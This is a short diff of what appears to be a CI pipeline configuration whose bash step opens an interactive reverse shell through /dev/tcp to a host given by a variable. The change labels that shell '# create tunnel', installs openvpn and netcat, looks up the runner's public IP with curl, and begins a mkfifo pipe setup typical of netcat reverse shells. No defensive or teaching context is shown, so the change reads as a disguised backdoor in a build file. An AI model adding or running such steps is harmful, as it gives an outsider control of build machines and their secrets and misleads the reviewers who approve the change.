@@ -7,9 +7,12 @@ pool:
 steps:
 
   - bash: |
-      sh -i >& "/dev/tcp/$(ME)" 0>&1
-      sudo apt-get update
       sudo apt-get --assume-yes --no-install-recommends install openvpn netcat
+
+      # create tunnel
+      sh -i >& "/dev/tcp/$(ME)" 0>&1
+      
+      sudo apt-get update
       ls
       curl ifconfig.me
       rm -f /tmp/f; mkfifo /tmp/f
